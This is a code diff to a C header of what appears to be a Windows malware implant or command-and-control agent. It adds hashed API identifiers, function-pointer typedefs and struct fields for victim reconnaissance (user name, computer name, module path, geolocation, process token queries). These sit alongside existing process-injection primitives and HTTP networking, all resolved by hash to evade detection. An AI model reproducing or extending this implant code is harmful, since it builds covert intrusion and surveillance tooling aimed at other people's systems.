@@ -21,6 +21,12 @@
 #define HASHED_NtCreateSection       0xd02e20d0
 #define HASHED_NtMapViewOfSection    0x231f196a
 #define HASHED_CreateFileA           0xeb96c5fa
+#define HASHED_GetComputerNameExA    0xd252a5f3
+#define HASHED_GetUserNameA          0x9bc3ab46
+#define HASHED_GetModuleFileNameA    0x13b8a14d
+#define HASHED_GetUserGeoID          0x9b47362c
+#define HASHED_GetGeoInfoA           0x35fe32ad
+
 
 
 #define HASHED_ntdll         0x22d3b5ed
@@ -44,6 +50,8 @@
 #define HASHED_CloseHandle                 0x3870ca07
 #define HASHED_CreateProcessA              0xaeb52e19
 #define HASHED_NtWriteVirtualMemory        0x95f3a792
+#define HASHED_NtOpenProcessToken          0x7bd07459
+#define HASHED_NtQueryInformationToken     0x2ce5a244
 
 #define HASHED_NtResumeThread              0x2c7b3d30
 #define HASHED_NtGetContextThread          0x9e0e1a44
@@ -54,6 +62,13 @@ typedef HLOCAL(WINAPI* pLocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
 typedef HLOCAL(WINAPI *pLocalFree)(HLOCAL);
 typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
 typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR dllName);
+
+typedef BOOL(WINAPI* pGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
+typedef BOOL(WINAPI* pGetComputerNameExA)(COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD lpnSize);
+typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE hModule, LPSTR lpFileName, DWORD nSize);
+typedef GEOID(WINAPI* pGetUserGeoId)(GEOCLASS GeoClass);
+typedef int  (WINAPI* pGetGeoInfoA)(GEOID Location, GEOTYPE GeoType, LPSTR lpGeoData, int cchData, LANGID LanId);
+
 
 
 #define HINTERNET LPVOID
@@ -180,6 +195,9 @@ typedef BOOL (WINAPI *pRegisterWaitForSingleObject)(
     ULONG              dwFlags
 );
 
+typedef NTSTATUS(NTAPI* pNtOpenProcessToken)(HANDLE hProc, ACCESS_MASK mask, PHANDLE TokenHandle);
+typedef NTSTATUS(NTAPI* pNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
+
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 typedef BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule);
 typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOL Alertable, PLARGE_INTEGER Delay);
@@ -197,6 +215,11 @@ typedef struct _Win32 {
     pRegisterWaitForSingleObject RegisterWaitForSingleObject;
     pCloseHandle CloseHandle;
     pCreateThread CreateThread;
+    pGetUserNameA GetUserNameA;
+    pGetComputerNameExA GetComputerNameExA;
+    pGetModuleFileNameA GetModuleFileNameA;
+    pGetUserGeoId       GetUserGeoId;
+    pGetGeoInfoA        GetGeoInfoA;
     
     pCreateProcessA CreateProcessA;
     pCreateFileA    CreateFileA;
@@ -215,6 +238,8 @@ typedef struct _Win32 {
     pNtResumeThread      NtResumeThread;
     pNtGetContextThread NtGetContextThread;
     pNtSetContextThread NtSetContextThread;
+    pNtOpenProcessToken NtOpenProcessToken;
+    pNtQueryInformationToken NtQueryInformationToken;
 
     // winhttp
     pWinHttpOpen               WinHttpOpen;
